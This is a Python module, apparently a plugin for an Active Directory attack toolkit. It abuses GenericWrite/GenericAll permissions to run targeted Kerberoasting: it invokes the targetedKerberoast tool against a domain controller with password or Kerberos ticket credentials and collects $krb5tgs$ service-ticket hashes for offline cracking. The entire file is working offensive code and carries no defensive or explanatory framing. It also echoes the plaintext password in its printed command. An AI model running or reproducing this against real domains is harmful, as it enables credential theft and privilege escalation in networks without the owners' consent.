import subprocess
import os


def run(data, cred, args):
    """
    Abuse GenericWrite/GenericAll to perform targeted Kerberoasting.
    Supports password + Kerberos (ccache).

    Returns:
        list of hashes or None
    """

    extra = getattr(args, "extra", []) or []
    if len(extra) < 1:
        print("[-] Missing target user")
        return None

    target_user = extra[0]
    ip = data.get("ip")
    domain = data.get("domain")

    if not ip or not domain:
        print("[-] Missing IP or Domain")
        return None

    if not cred:
        print("[-] No active credential")
        return None

    username = cred.get("user")

    cmd = [
        "targetedKerberoast",
        "-d", domain,
        "--dc-ip", ip,
    ]

    # -------------------------
    # Auth handling
    # -------------------------

    # ---- Kerberos ----
    if cred.get("type") == "ticket" or cred.get("ccache"):
        ccache = cred.get("ccache") or os.environ.get("KRB5CCNAME")

        if not ccache:
            print("[-] No ccache found in credential or environment")
            return None

        # ensure env is set
        os.environ["KRB5CCNAME"] = ccache

        cmd += ["-k"]

        # some tools still require username
        if username:
            cmd += ["-u", username]

    # ---- Password ----
    else:
        password = cred.get("secret") if cred.get("type") == "password" else None

        if not username or not password:
            print("[-] Need password-based credential")
            return None

        cmd += ["-u", username, "-p", password]

    print(f"[*] Running: {' '.join(cmd)}")

    # -------------------------
    # Execute
    # -------------------------
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout + result.stderr

        # -------------------------
        # Parse hashes
        # -------------------------
        hashes = []

        for line in output.splitlines():
            if "$krb5tgs$" in line:
                hashes.append(line.strip())

        if hashes:
            print(f"[+] Found {len(hashes)} hash(es)")
            return hashes

        print("[-] No hashes found")
        return None

    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return None